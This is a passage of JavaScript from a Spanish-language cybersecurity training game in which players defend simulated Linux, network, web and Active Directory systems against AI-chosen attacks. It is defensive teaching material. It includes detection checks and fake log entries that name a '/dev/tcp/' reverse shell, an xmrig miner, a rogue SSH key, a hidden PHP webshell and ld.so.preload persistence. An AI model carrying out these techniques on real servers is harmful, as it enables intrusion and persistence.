"use strict";
// ======================================================================
// NetLab — Red vs Blue: el atacante juega, tú defiendes (CCNA, Wireshark y Linux)
// Todo es simulado: nada sale de la app ni toca tu PC o tu red.
// ======================================================================
const RB = { modo: "linux", dif: "normal", ia: true, activo: false };
const DIF_RB = {
  facil: { nombre: "Fácil", hp: 100, danio: 15, tick: 22, durLinux: 360, umbral: 4, alertas: "detalladas", bonus: 1 },
  normal: { nombre: "Normal", hp: 100, danio: 25, tick: 14, durLinux: 480, umbral: 3, alertas: "genericas", bonus: 1.5 },
  dificil: { nombre: "Difícil", hp: 100, danio: 35, tick: 9, durLinux: 600, umbral: 2, alertas: "ninguna", bonus: 2.5 },
  pesadilla: { nombre: "☠️ Pesadilla", hp: 100, danio: 50, tick: 6, durLinux: 720, umbral: 1, alertas: "ninguna", bonus: 4 },
};
const fmtT = (s) => `${Math.floor(s / 60)}:${String(Math.max(0, Math.floor(s % 60))).padStart(2, "0")}`;

function pintarRvbInicio() {
  pararRvb();
  $("#rvbVista").innerHTML = `<div class="tarjeta">
    <div class="rvb-modos">
      ${[["linux", "🐧", "Linux", "Un atacante entra a tu servidor EN VIVO: fuerza bruta por SSH, usuarios root falsos, cron, minero, llaves SSH. Lo detectas en los logs y lo sacas desde la terminal."],
        ["wireshark", "🦈", "Wireshark", "Te llegan oleadas de tráfico. En cada una: ¿quién ataca o qué se robó?, ¿qué técnica es? y el filtro que lo aísla. Con reloj."],
        ["ccna", "🌐", "CCNA", "Saltan alertas en tus switches y routers (DHCP falso o starvation, MAC flooding, switch pirata, root guard, SNMP, CDP, puertos libres…). Te defiendes tecleando la config de IOS correcta."],
        ["web", "🕸️", "Web", "Tu sitio está bajo ataque y solo tienes el access.log: SQLi, XSS, path traversal, fuerza bruta, fuzzing, inyección de comandos y webshells. Encuentras la evidencia, nombras la técnica y lo contienes."],
        ["ad", "🏢", "Windows / AD", "El dominio está en la mira: Kerberoasting, AS-REP roasting, password spraying, Pass-the-Hash, DCSync, PsExec y cuentas de admin falsas. Lo cazas por Event ID y lo contienes con PowerShell."]]
        .map(([k, ic, n, d]) => `<button class="rvb-modo ${RB.modo === k ? "sel" : ""}" data-rvb-modo="${k}"><span class="icono">${ic}</span><b>${n}</b><span class="sub">${d}</span></button>`).join("")}
    </div>
    <div class="fila">
      <label>Dificultad<select id="rbDif">${Object.entries(DIF_RB).map(([k, v]) => `<option value="${k}" ${RB.dif === k ? "selected" : ""}>${v.nombre}</option>`).join("")}</select></label>
      <label class="check" style="align-self:end"><input type="checkbox" id="rbIa" ${RB.ia ? "checked" : ""}> La IA dirige al atacante (se adapta a lo que fallas)</label>
    </div>
    <p class="sub" id="rbDesc"></p>
    <div class="acciones"><button class="primario" id="rbEmpezar">⚔️ Empezar</button>
      <button class="primario btn-teofondo" id="rbTeoFondo">📖 Teoría a fondo del modo</button><button id="rbTeoLec">📚 Lecciones y exámenes</button></div>
    <div id="rbTeoFondoCaja" hidden></div></div>`;
  const CTX_RB = {
    linux: "Defensa de un servidor Linux atacado en vivo: detectar fuerza bruta por SSH en /var/log/auth.log, usuarios con UID 0 falsos en /etc/passwd, persistencia con cron y llaves SSH en authorized_keys, procesos de minería; y erradicarlo desde la terminal (ps, kill, userdel, crontab, iptables/ufw, fail2ban).",
    wireshark: "Análisis de tráfico malicioso con Wireshark: escaneos de puertos (SYN, XMAS, NULL), fuerza bruta, inundaciones (SYN flood), envenenamiento ARP, DNS tunneling, exfiltración y beaconing; identificar al atacante, la técnica y el filtro de visualización que lo aísla.",
    ccna: "Seguridad de capa 2 y de dispositivos en IOS: DHCP snooping contra DHCP falso y DHCP starvation (limit rate), port security contra MAC flooding, BPDU guard y root guard contra switches piratas, Dynamic ARP Inspection, CDP en puertos de usuario, SNMP con community por defecto, apagar puertos sin uso, protección de las líneas VTY (SSH, ACL, login block-for) contra fuerza bruta.",
    web: "Detección y contención de ataques web leyendo el access.log de Apache/Nginx: inyección SQL, XSS reflejado y robo de cookies, path traversal/LFI, fuerza bruta al login, enumeración de directorios (gobuster, ffuf, nikto), inyección de comandos y webshells; cómo se ven en los logs, cómo se mapean a MITRE ATT&CK y cómo se contienen (bloqueo de IP con ufw/iptables/nginx, WAF, corrección del código).",
    ad: "Detección de ataques a Active Directory con los eventos de seguridad de Windows: Kerberoasting (4769 con cifrado 0x17), AS-REP roasting (4768 con PreAuthType 0), password spraying (4771/4625), Pass-the-Hash (4624 NTLM tipo 3), DCSync (4662 con los GUID de replicación), PsExec (5145, 7045, 4688) y persistencia con cuentas nuevas en Domain Admins (4720, 4728); contención con PowerShell (Disable-ADAccount) y mitigaciones (gMSA, AES, Protected Users, LAPS, reset de krbtgt)." };
  $("#rbTeoFondo").addEventListener("click", (ev) => {
    const caja = $("#rbTeoFondoCaja"), m = RB.modo || "linux";
    if (caja.dataset.modo !== m) { caja.innerHTML = ""; delete caja.dataset.listo; caja.dataset.modo = m; }
    const titulos = { ccna: "Seguridad en switches y routers", linux: "Defender un servidor Linux", wireshark: "Detectar ataques en el tráfico",
      web: "Detectar ataques web en el access.log", ad: "Detectar ataques a Active Directory" };
    teoriaAFondo(ev.target, caja, { clave: `rvb:${m}`, mundo: ["web", "ad"].includes(m) ? "soc" : m, titulo: `Red vs Blue · ${titulos[m]}`, contexto: CTX_RB[m] });
  });
  $("#rbTeoLec").addEventListener("click", () => irTeoria(["web", "ad"].includes(RB.modo) ? "soc" : RB.modo || "linux", null));
  const desc = () => {
    const d = DIF_RB[$("#rbDif").value];
    $("#rbDesc").textContent = $("#rbDif").value === "facil" ? "Fácil: más tiempo, alertas del SIEM con detalle, pistas y menos daño."
      : $("#rbDif").value === "normal" ? "Normal: alertas genéricas, una pista y el atacante insiste más rápido."
      : $("#rbDif").value === "dificil" ? "Difícil: sin alertas ni pistas, poco tiempo, el atacante borra sus huellas y castiga cada error. Da más XP."
      : "☠️ Pesadilla: un APT. Entra al primer intento, ataca cada pocos segundos, borra huellas, cada fallo duele el doble y casi no hay tiempo. ×4 XP si sobrevives.";
    return d;
  };
  desc();
  $("#rbDif").addEventListener("change", desc);
  $$("[data-rvb-modo]").forEach((b) => b.addEventListener("click", () => { RB.modo = b.dataset.rvbModo; $$("[data-rvb-modo]").forEach((x) => x.classList.toggle("sel", x === b)); }));
  $("#rbEmpezar").addEventListener("click", () => {
    RB.dif = $("#rbDif").value; RB.ia = $("#rbIa").checked;
    ({ linux: empezarLinuxRvb, wireshark: empezarWsRvb, ccna: empezarCcnaRvb, web: () => empezarWebRvb(), ad: () => empezarAdRvb() })[RB.modo]();
  });
}

function pararRvb() { RB.activo = false; clearInterval(RB.reloj); clearTimeout(RB.tickT); }

async function jugadaIA(opciones) {
  try { return await api("/api/rvb/jugada", { opciones, historial: RB.hist.slice(-12), dificultad: RB.dif, ia: RB.ia }); }
  catch { return { accion: opciones[Math.floor(Math.random() * opciones.length)], mensaje: "" }; }
}

function hud(titulo) {
  return `<div class="rvb-hud">
    <div><b>${titulo}</b> <span class="pill">${DIF_RB[RB.dif].nombre}</span></div>
    <div class="rvb-vida"><span>🛡️ Integridad</span><div class="j-barra grande"><i id="rbVida"></i></div><b id="rbVidaN"></b></div>
    <div class="rvb-marcador"><span id="rbPuntos">0 pts</span><span id="rbReloj">⏱ 0:00</span></div></div>
    <div class="rvb-atacante" id="rbMsg" hidden></div>`;
}
function actualizarHud() {
  const v = Math.max(0, RB.hp);
  if (!$("#rbVida")) return;
  $("#rbVida").style.width = `${v}%`;
  $("#rbVida").style.background = v > 60 ? "var(--ok)" : v > 30 ? "var(--nodata)" : "var(--falla)";
  $("#rbVidaN").textContent = `${Math.round(v)}%`;
  $("#rbPuntos").textContent = `${Math.round(RB.puntos)} pts`;
}
function mensajeAtacante(t) {
  if (!t || !$("#rbMsg")) return;
  $("#rbMsg").hidden = false;
  $("#rbMsg").innerHTML = `💀 <b>Atacante:</b> ${esc(t)}`;
}

async function finRvb(gano, resumen) {
  pararRvb();
  const puntos = Math.round(Math.max(0, RB.puntos) * (gano ? DIF_RB[RB.dif].bonus : 0.5));
  api("/api/rvb/resultado", { modo: RB.modo, dificultad: RB.dif, puntos, gano, detalle: JSON.stringify(RB.hist).slice(0, 3900) }).catch(() => {});
  setTimeout(() => refrescarJugador(true), 400);
  $("#rvbVista").innerHTML = `<div class="tarjeta rvb-fin ${gano ? "gano" : "perdio"}">
    <div class="rvb-titulo-fin">${gano ? "🛡️ ¡Contuviste el ataque!" : "💀 El atacante ganó"}</div>
    <div class="sub">${DIF_RB[RB.dif].nombre} · ${puntos} puntos ${gano ? `(×${DIF_RB[RB.dif].bonus} por dificultad)` : ""}</div>
    ${resumen}
    <h3>Reporte del SOC</h3><div id="rbReporte"><button id="rbPedirRep">🤖 Pedirle al tutor el reporte del incidente</button></div>
    <div class="acciones"><button class="primario" id="rbOtra">Otra partida</button></div></div>`;
  $("#rbOtra").addEventListener("click", pintarRvbInicio);
  $("#rbPedirRep").addEventListener("click", async () => {
    try {
      const r = await trabajo("/api/tutor", { area: { ccna: "CCNA (seguridad de red)", wireshark: "Wireshark (análisis de incidentes)", linux: "Linux (respuesta a incidentes)",
        web: "SOC (ataques web en el access.log)", ad: "SOC (ataques a Active Directory)" }[RB.modo] || "SOC",
        contexto: `Ejercicio Red vs Blue simulado (${RB.modo}, dificultad ${RB.dif}). Resultado: ${gano ? "contenido" : "perdido"}.\nCronología: ${JSON.stringify(RB.hist).slice(0, 2500)}`,
        pregunta: "Escríbeme un reporte breve de SOC: qué hizo el atacante, qué detecté bien, qué se me pasó o tardé y los comandos o configuración exacta que debí usar. Termina con 3 consejos para la próxima." }, $("#rbReporte"));
      $("#rbReporte").innerHTML = `<div class="respuesta-tutor">${md(r.respuesta)}</div>`;
    } catch (e) { $("#rbReporte").innerHTML = `<p class="error">${esc(e.message)}</p>`; }
  });
}

// ====================================================================== CCNA
async function empezarCcnaRvb() {
  const d = DIF_RB[RB.dif];
  const r = await api("/api/rvb/ccna", { op: "nueva", dificultad: RB.dif });
  Object.assign(RB, { activo: true, partida: r.partida, restantes: [...r.opciones], hp: d.hp, puntos: 0, hist: [], oleada: 0, total: r.oleadas, seg: r.seg, pistas: r.pistas });
  siguienteOleadaCcna();
}

async function siguienteOleadaCcna() {
  if (!RB.activo) return;
  if (RB.oleada >= RB.total || !RB.restantes.length) return finCcnaRvb(true);
  RB.oleada++;
  $("#rvbVista").innerHTML = `<div class="tarjeta">${hud(`🌐 Red vs Blue · CCNA · Oleada ${RB.oleada}/${RB.total}`)}<div class="trabajo"><div class="girar"></div><div>El atacante está eligiendo su jugada…</div></div></div>`;
  actualizarHud();
  const j = await jugadaIA(RB.restantes);
  const accion = RB.restantes.includes(j.accion) ? j.accion : RB.restantes[0];
  RB.restantes = RB.restantes.filter((x) => x !== accion);
  const a = await api("/api/rvb/ccna", { op: "ataque", partida: RB.partida, accion });
  RB.actual = { accion, ...a, pistasUsadas: 0, inicio: Date.now() };
  $("#rvbVista").innerHTML = `<div class="tarjeta">${hud(`🌐 Red vs Blue · CCNA · Oleada ${RB.oleada}/${RB.total}`)}
    <div class="rvb-alerta"><div class="sub">🚨 ALERTA · ${esc(a.dispositivo)}</div><b>${esc(a.titulo)}</b><p>${esc(a.alerta)}</p></div>
    <label>Tu configuración para ${esc(a.dispositivo)} (lo que teclearías en <code>configure terminal</code>; se aceptan abreviaturas)
      <textarea id="rbCfg" class="mono" rows="9" spellcheck="false" placeholder="interface fa0/5&#10; switchport mode access&#10; ..."></textarea></label>
    <div class="acciones"><button class="primario" id="rbRevisar">🛡️ Aplicar defensa</button>
      ${RB.pistas ? `<button id="rbPista">💡 Pista (${Math.min(RB.pistas, a.n_pistas)})</button>` : ""}<button id="rbRendir">🏳️ Me rindo</button></div>
    <div id="rbFb"></div></div>`;
  mensajeAtacante(j.mensaje);
  actualizarHud();
  $("#rbRevisar").addEventListener("click", () => revisarCcnaRvb(false));
  $("#rbPista")?.addEventListener("click", async () => {
    if (RB.actual.pistasUsadas >= Math.min(RB.pistas, a.n_pistas)) return;
    const p = await api("/api/rvb/ccna", { op: "pista", partida: RB.partida, accion, n: RB.actual.pistasUsadas });
    RB.actual.pistasUsadas++; RB.puntos -= 15;
    $("#rbFb").insertAdjacentHTML("beforeend", `<p class="lx-pista">💡 ${esc(p.pista)} <span class="sub">(−15 pts)</span></p>`);
    $("#rbPista").textContent = `💡 Pista (${Math.min(RB.pistas, a.n_pistas) - RB.actual.pistasUsadas})`;
    actualizarHud();
  });
  $("#rbRendir").addEventListener("click", () => revisarCcnaRvb(true));
  clearInterval(RB.reloj);
  RB.reloj = setInterval(() => {
    const resta = RB.seg - (Date.now() - RB.actual.inicio) / 1000;
    if ($("#rbReloj")) $("#rbReloj").textContent = `⏱ ${fmtT(resta)}`;
    if (resta <= 0) revisarCcnaRvb(true);
  }, 250);
}

async function revisarCcnaRvb(final) {
  if (!RB.activo || RB.actual.cerrada) return;
  const r = await api("/api/rvb/ccna", { op: "revisar", partida: RB.partida, accion: RB.actual.accion, config: $("#rbCfg").value, final });
  const seg = (Date.now() - RB.actual.inicio) / 1000;
  if (r.ok) {
    RB.actual.cerrada = true; clearInterval(RB.reloj);
    const pts = 100 + Math.round(100 * Math.max(0, 1 - seg / RB.seg));
    RB.puntos += pts;
    RB.hist.push({ accion: RB.actual.accion, resultado: "bloqueado", segundos: Math.round(seg) });
    $("#rbFb").innerHTML = `<div class="rvb-ok">🛡️ ¡Bloqueado en ${Math.round(seg)} s! +${pts} pts · Técnica: ${esc(r.tecnica)}</div>
      <details><summary class="sub">Una solución de referencia</summary><pre>${esc(r.solucion.join("\n"))}</pre></details>
      <div class="acciones"><button class="primario" id="rbSig">Siguiente oleada →</button></div>`;
    $("#rbRevisar").disabled = true; $("#rbRendir").disabled = true; if ($("#rbPista")) $("#rbPista").disabled = true;
    $("#rbSig").addEventListener("click", siguienteOleadaCcna);
  } else if (final) {
    RB.actual.cerrada = true; clearInterval(RB.reloj);
    RB.hp -= DIF_RB[RB.dif].danio;
    RB.hist.push({ accion: RB.actual.accion, resultado: "exito", faltaba: r.faltan });
    const sol = r.solucion || (await api("/api/rvb/ccna", { op: "solucion", partida: RB.partida, accion: RB.actual.accion })).solucion;
    agregarRepaso("CCNA", "flash", { enunciado: `¿Cómo frenas esto? ${RB.actual.alerta}`, respuestas: sol, explicacion: `Técnica: ${r.tecnica}`, origen: "Red vs Blue" }, "rvb:" + RB.actual.accion);
    $("#rbFb").innerHTML = `<div class="rvb-mal">💥 El ataque pasó (−${DIF_RB[RB.dif].danio}% de integridad). Técnica: ${esc(r.tecnica)}</div>
      <p class="sub">Te faltó: ${r.faltan.map(esc).join("; ")}</p><p><b>Así se frenaba:</b></p><pre>${esc(sol.join("\n"))}</pre>
      <div class="acciones"><button class="primario" id="rbSig">${RB.hp > 0 ? "Siguiente oleada →" : "Ver resultado"}</button></div>`;
    $("#rbRevisar").disabled = true; $("#rbRendir").disabled = true; if ($("#rbPista")) $("#rbPista").disabled = true;
    actualizarHud();
    $("#rbSig").addEventListener("click", () => RB.hp > 0 ? siguienteOleadaCcna() : finCcnaRvb(false));
  } else {
    RB.puntos -= 10;
    $("#rbFb").innerHTML = `<div class="rvb-mal">✗ Todavía no lo frena (−10 pts). Falta: ${r.faltan.map(esc).join("; ")}</div>`;
  }
  actualizarHud();
}

function finCcnaRvb(gano) {
  finRvb(gano && RB.hp > 0, `<ul class="rvb-crono">${RB.hist.map((h) => `<li class="${h.resultado === "bloqueado" ? "ok-txt" : "error"}">${h.resultado === "bloqueado" ? "🛡️" : "💥"} ${esc(h.accion.replace(/_/g, " "))}${h.segundos ? ` · ${h.segundos} s` : ""}</li>`).join("")}</ul>`);
}

// ====================================================================== Wireshark
async function empezarWsRvb() {
  const r = await api("/api/rvb/ws", { op: "nueva", dificultad: RB.dif });
  Object.assign(RB, { activo: true, partida: r.partida, restantes: [...r.opciones], tecnicas: r.tecnicas, hp: 100, puntos: 0, hist: [], oleada: 0,
    total: Math.min(r.oleadas, r.opciones.length), seg: r.seg + 60 });
  siguienteOleadaWs();
}

async function siguienteOleadaWs() {
  if (!RB.activo) return;
  if (RB.oleada >= RB.total) return finWsRvb(true);
  RB.oleada++;
  $("#rvbVista").innerHTML = `<div class="tarjeta">${hud(`🦈 Red vs Blue · Wireshark · Oleada ${RB.oleada}/${RB.total}`)}<div class="trabajo"><div class="girar"></div><div>Capturando la siguiente oleada de tráfico…</div></div></div>`;
  actualizarHud();
  const j = await jugadaIA(RB.restantes);
  const accion = RB.restantes.includes(j.accion) ? j.accion : RB.restantes[0];
  RB.restantes = RB.restantes.filter((x) => x !== accion);
  const o = await api("/api/rvb/ws", { op: "oleada", partida: RB.partida, accion });
  RB.actual = { accion, inicio: Date.now() };
  $("#rvbVista").innerHTML = `<div class="tarjeta">${hud(`🦈 Red vs Blue · Wireshark · Oleada ${RB.oleada}/${RB.total}`)}
    <div class="rvb-alerta"><div class="sub">🚨 IDS · tráfico sospechoso</div><b>Llegó una captura de ${o.paquetes} paquetes</b>
      <p>Ábrela, entiende qué está pasando y responde antes de que el atacante termine.</p>
      <div class="acciones"><button class="primario" id="rbAbrirWs">Abrir en Wireshark</button></div></div>
    <div class="pregunta"><b>1. ${esc(o.pregunta)}</b><input class="mono" id="rbResp" autocomplete="off"></div>
    <div class="pregunta"><b>2. ¿Qué técnica es?</b><select id="rbTec"><option value="">— elige —</option>${RB.tecnicas.map((t) => `<option value="${esc(t)}">${esc(t)}</option>`).join("")}</select></div>
    <div class="pregunta"><b>3. Filtro: ${esc(o.filtro)}</b><input class="mono" id="rbFil" autocomplete="off" placeholder="filtro de visualización"></div>
    <div class="acciones"><button class="primario" id="rbRevisar">🛡️ Responder al incidente</button></div><div id="rbFb"></div></div>`;
  mensajeAtacante(j.mensaje);
  actualizarHud();
  $("#rbAbrirWs").addEventListener("click", () => api("/api/rvb/ws", { op: "abrir", partida: RB.partida, accion }).then((r) => aviso(r.ok ? "Abriendo Wireshark…" : r.error)));
  $("#rbRevisar").addEventListener("click", () => revisarWsRvb(false));
  clearInterval(RB.reloj);
  RB.reloj = setInterval(() => {
    const resta = RB.seg - (Date.now() - RB.actual.inicio) / 1000;
    if ($("#rbReloj")) $("#rbReloj").textContent = `⏱ ${fmtT(resta)}`;
    if (resta <= 0) revisarWsRvb(true);
  }, 250);
}

async function revisarWsRvb(tiempo) {
  if (!RB.activo || RB.actual.cerrada) return;
  RB.actual.cerrada = true; clearInterval(RB.reloj);
  $("#rbRevisar").disabled = true;
  const r = await api("/api/rvb/ws", { op: "revisar", partida: RB.partida, accion: RB.actual.accion,
    respuesta: $("#rbResp").value, tecnica: $("#rbTec").value, filtro: $("#rbFil").value });
  const seg = (Date.now() - RB.actual.inicio) / 1000;
  const buenas = [r.respuesta, r.tecnica, r.filtro].filter(Boolean).length;
  const danio = Math.round(DIF_RB[RB.dif].danio * (3 - buenas) / 3);
  const pts = buenas * 40 + (buenas === 3 ? Math.round(80 * Math.max(0, 1 - seg / RB.seg)) : 0);
  RB.hp -= danio; RB.puntos += pts;
  RB.hist.push({ accion: RB.actual.accion, resultado: buenas === 3 ? "bloqueado" : "exito", aciertos: buenas, segundos: Math.round(seg) });
  const c = r.correctas;
  $("#rbFb").innerHTML = `<div class="${buenas === 3 ? "rvb-ok" : "rvb-mal"}">${buenas === 3 ? "🛡️ ¡Incidente contenido!" : tiempo ? "⏱ Se acabó el tiempo." : "💥 Respuesta incompleta."} ${buenas}/3 · +${pts} pts${danio ? ` · −${danio}% integridad` : ""}</div>
    <ul class="rvb-crono"><li class="${r.respuesta ? "ok-txt" : "error"}">1. ${esc(c.respuesta)} — ${esc(c.explicacion)}</li>
      <li class="${r.tecnica ? "ok-txt" : "error"}">2. ${esc(c.tecnica)}</li>
      <li class="${r.filtro ? "ok-txt" : "error"}">3. <code>${esc(c.filtro)}</code>${r.error_filtro ? ` <span class="sub">(${esc(r.error_filtro)})</span>` : ""}</li></ul>
    <div class="acciones"><button class="primario" id="rbSig">${RB.hp > 0 ? "Siguiente oleada →" : "Ver resultado"}</button></div>`;
  actualizarHud();
  $("#rbSig").addEventListener("click", () => RB.hp > 0 ? siguienteOleadaWs() : finWsRvb(false));
}

function finWsRvb(gano) {
  finRvb(gano && RB.hp > 0, `<ul class="rvb-crono">${RB.hist.map((h) => `<li class="${h.resultado === "bloqueado" ? "ok-txt" : "error"}">${h.resultado === "bloqueado" ? "🛡️" : "💥"} ${esc(h.accion.replace(/_/g, " "))} · ${h.aciertos}/3 · ${h.segundos} s</li>`).join("")}</ul>`);
}

// ====================================================================== Linux (en vivo)
const LRB = {};
function ipAtacante() { return `${[45, 103, 185, 193, 203][Math.floor(Math.random() * 5)]}.${1 + Math.floor(Math.random() * 250)}.${1 + Math.floor(Math.random() * 250)}.${2 + Math.floor(Math.random() * 250)}`; }
const hora = () => { const d = new Date(); return `Nov 13 ${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}`; };
function logAuth(sh, linea) { const n = Linux.nodo(sh, "/var/log/auth.log"); n.d += `${hora()} netlab ${linea}\n`; }

function empezarLinuxRvb() {
  const d = DIF_RB[RB.dif];
  if (typeof pintarRutaLinux === "function" && LX.mision !== undefined) $("#linuxVista").innerHTML = "";  // evita dos terminales con los mismos ids
  const sh = Linux.nuevoSistema();
  Linux.escribir(sh, "/var/log/auth.log", "", "root", "640");
  for (let k = 0; k < 4; k++) logAuth(sh, `sshd[${1800 + k}]: Accepted publickey for alumno from 192.168.1.20 port ${50100 + k} ssh2`);
  const pw = Linux.nodo(sh, "/etc/passwd"); pw.d += "backup:x:1001:1001:Respaldos:/home/backup:/bin/bash\n"; sh.usuarios.push("backup");
  Linux.mkdirP(sh, "/home/backup", "backup");
  Linux.escribir(sh, "/etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n", "root");
  Linux.mkdirP(sh, "/root/.ssh", "root").m = "700";
  Linux.escribir(sh, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIadmin alumno@laptop\n", "root", "600");
  for (const b of ["passwd", "sudo", "su", "mount"]) { Linux.escribir(sh, `/usr/bin/${b}`, "ELF…", "root", "755"); Linux.nodo(sh, `/usr/bin/${b}`).suid = true; }
  Linux.mkdirP(sh, "/var/www/html/uploads", "www-data");
  Linux.escribir(sh, "/var/www/html/index.php", "<?php include 'tienda.php'; ?>\n", "www-data");
  Linux.escribir(sh, "/var/www/html/uploads/logo.png", "PNG…", "www-data");
  sh.servicios.apache2 = { activo: true, habilitado: true };
  Linux.comandos.ps([], null, sh);
  Object.assign(RB, { activo: true, hp: d.hp, puntos: 0, hist: [], inicio: Date.now() });
  Object.assign(LRB, { sh, ip: ipAtacante(), ips: [], intentos: 0, acceso: false, hecho: {}, alertas: [], histPos: 0, eventos: [] });
  LRB.ips.push(LRB.ip);
  $("#rvbVista").innerHTML = `<div class="tarjeta">${hud("🐧 Red vs Blue · Linux · servidor web en producción")}</div>
    <div class="lx-juego">
      <div class="tarjeta lx-panel">
        <h3 style="margin-top:0">🚨 SIEM</h3>
        <div id="rbAlertas" class="rvb-alertas"><p class="sub">${d.alertas === "ninguna" ? "En esta dificultad no hay alertas: revisa tú los logs." : "Aquí aparecen las alertas."}</p></div>
        <h3>Tu misión</h3>
        <p class="sub">Eres el admin de este servidor. Alguien lo va a atacar. Detecta qué hace (logs, usuarios, procesos, cron, llaves SSH, conexiones) y sácalo. Ganas si llegas al final del tiempo con integridad y sin el atacante adentro.</p>
        <details><summary class="sub">Comandos útiles</summary><p class="sub"><code>sudo tail /var/log/auth.log</code> · <code>who</code> · <code>last</code> · <code>ps aux</code> · <code>sudo ufw deny from IP</code> · <code>sudo ufw enable</code> · <code>sudo usermod -L usuario</code> · <code>sudo userdel usuario</code> · <code>sudo pkill -f nombre</code> · <code>cat /etc/crontab</code> · <code>sudo sed -i '/texto/d' archivo</code> · <code>sudo cat /root/.ssh/authorized_keys</code> · <code>ss -tnp</code> · <code>find / -perm -4000 2>/dev/null</code> · <code>ls -la /var/www/html/uploads</code> · <code>cat /etc/ld.so.preload</code> · <code>sudo kill PID</code></p></details>
        <div class="acciones"><button id="rbTerminar">🏁 Terminar y declarar contenido</button></div>
      </div>
      <div class="lx-terminal" id="lxTerm" tabindex="0"><pre id="lxSalida"></pre>
        <div class="lx-linea"><span id="lxPrompt"></span><input id="lxIn" autocomplete="off" spellcheck="false" autocapitalize="off"></div></div>
    </div>`;
  LX.sh = sh; LX.mision = null;
  escribirTerm("Servidor web de la empresa. Turno de noche. Todo parece tranquilo…\n\n");
  actualizarPrompt();
  const inp = $("#lxIn");
  $("#lxTerm").addEventListener("click", () => inp.focus());
  inp.addEventListener("keydown", (e) => {
    if (e.key === "Enter" && inp.value.trim()) LRB.eventos.push({ t: Math.round((Date.now() - RB.inicio) / 1000), tu: inp.value.trim() });
    teclaLinux(e);
    if (e.key === "Enter") evaluarLinuxRvb();
  });
  inp.focus();
  $("#rbTerminar").addEventListener("click", () => finLinuxRvb(true));
  actualizarHud();
  clearInterval(RB.reloj);
  RB.reloj = setInterval(() => {
    const resta = d.durLinux - (Date.now() - RB.inicio) / 1000;
    if ($("#rbReloj")) $("#rbReloj").textContent = `⏱ ${fmtT(resta)}`;
    if (resta <= 0) finLinuxRvb(false);
  }, 250);
  RB.tickT = setTimeout(tickAtacante, 6000);
}

const bloqueada = (ip) => LRB.sh.servicios.ufw.activo && LRB.sh.ufw.some((r) => new RegExp(`^deny (from )?${ip.replace(/\./g, "\\.")}(\\b| )`).test(r));
function estadoLinux() {
  const sh = LRB.sh, pw = Linux.nodo(sh, "/etc/passwd").d, cron = Linux.nodo(sh, "/etc/crontab")?.d || "", keys = Linux.nodo(sh, "/root/.ssh/authorized_keys")?.d || "";
  return {
    usuario: /^svc-update:x:0:/m.test(pw), cron: cron.includes(LRB.ipCron || "@@"), minero: (sh.procesos || []).some((p) => p.cmd.includes("xmrig")),
    llave: keys.includes("kali@atacante"), sshOn: sh.servicios.ssh.activo, backupBloq: !!sh.bloqueados?.has("backup") || !/^backup:/m.test(pw),
    suid: !!Linux.nodo(sh, "/var/tmp/.sysd")?.suid, shell: (sh.procesos || []).some((p) => p.cmd.includes("/dev/tcp/")),
    webshell: !!Linux.nodo(sh, "/var/www/html/uploads/.thumb.php"), preload: !!(Linux.nodo(sh, "/etc/ld.so.preload")?.d || "").trim(),
  };
}
function alerta(texto, detalle) {
  const modo = DIF_RB[RB.dif].alertas;
  if (modo === "ninguna") return;
  $("#rbAlertas")?.insertAdjacentHTML("afterbegin", `<div class="rvb-alerta-li">${hora().slice(7)} · ${esc(modo === "detalladas" ? detalle : texto)}</div>`);
}
function puedeEntrar() {
  const e = estadoLinux();
  if (e.shell || e.webshell) return true;  // ya tiene un canal que no pasa por SSH
  if (!e.sshOn) return false;
  if (bloqueada(LRB.ip)) return false;
  return !e.backupBloq || e.usuario || e.llave;  // puertas traseras
}

async function tickAtacante() {
  if (!RB.activo) return;
  const d = DIF_RB[RB.dif], sh = LRB.sh, e = estadoLinux();
  // ¿sigue adentro? si le cerraste todas las puertas, pierde la sesión
  if (LRB.acceso && !puedeEntrar()) {
    LRB.acceso = false; sh.sesiones = [];
    RB.hist.push({ accion: "sesion_cortada", resultado: "bloqueado" });
  }
  let opciones;
  if (!LRB.acceso) opciones = bloqueada(LRB.ip) || !e.sshOn ? ["cambiar_ip"] : ["fuerza_bruta"];
  else opciones = ["usuario_root", "cron", "minero", "llave_ssh", "suid", "shell_inversa", "webshell", "ld_preload"]
    .filter((k) => !e[{ usuario_root: "usuario", cron: "cron", minero: "minero", llave_ssh: "llave", suid: "suid", shell_inversa: "shell", webshell: "webshell", ld_preload: "preload" }[k]]);
  if (LRB.acceso && (RB.dif === "dificil" || RB.dif === "pesadilla") && !LRB.hecho.borrar) opciones.push("borrar_huellas");
  if (!opciones.length) opciones = ["fuerza_bruta"];
  const j = await jugadaIA(opciones);
  if (!RB.activo) return;
  const acc = opciones.includes(j.accion) ? j.accion : opciones[0];
  const t = Math.round((Date.now() - RB.inicio) / 1000);
  if (acc === "cambiar_ip") {
    LRB.ip = ipAtacante(); LRB.ips.push(LRB.ip); LRB.intentos = 0;
    alerta("Nuevo origen de ataque", `El atacante cambió de IP: ahora viene de ${LRB.ip}`);
  } else if (acc === "fuerza_bruta") {
    if (!sh.servicios.ssh.activo || bloqueada(LRB.ip)) RB.hist.push({ accion: acc, resultado: "bloqueado" });
    else {
      for (let k = 0; k < 6; k++) logAuth(sh, `sshd[${3000 + Math.floor(Math.random() * 900)}]: Failed password for ${k % 2 ? "invalid user admin" : "backup"} from ${LRB.ip} port ${40000 + Math.floor(Math.random() * 20000)} ssh2`);
      LRB.intentos++;
      alerta("Muchos fallos de autenticación SSH", `6 intentos fallidos de SSH desde ${LRB.ip} (usuario backup)`);
      const puerta = estadoLinux().llave || estadoLinux().usuario;  // con puerta trasera entra sin adivinar
      if ((LRB.intentos >= d.umbral || puerta) && puedeEntrar()) {
        LRB.acceso = true;
        const usr = estadoLinux().backupBloq ? (estadoLinux().usuario ? "svc-update" : "root") : "backup";
        logAuth(sh, `sshd[${3999}]: Accepted password for ${usr} from ${LRB.ip} port 51515 ssh2`);
        sh.sesiones = [{ u: usr, tty: 1, h: hora().slice(7, 12), ip: LRB.ip }];
        alerta("Inicio de sesión exitoso inusual", `¡${usr} inició sesión desde ${LRB.ip}! (IP externa)`);
      }
      RB.hist.push({ accion: acc, resultado: LRB.acceso ? "exito" : "intento", ip: LRB.ip, t });
    }
  } else if (acc === "usuario_root") {
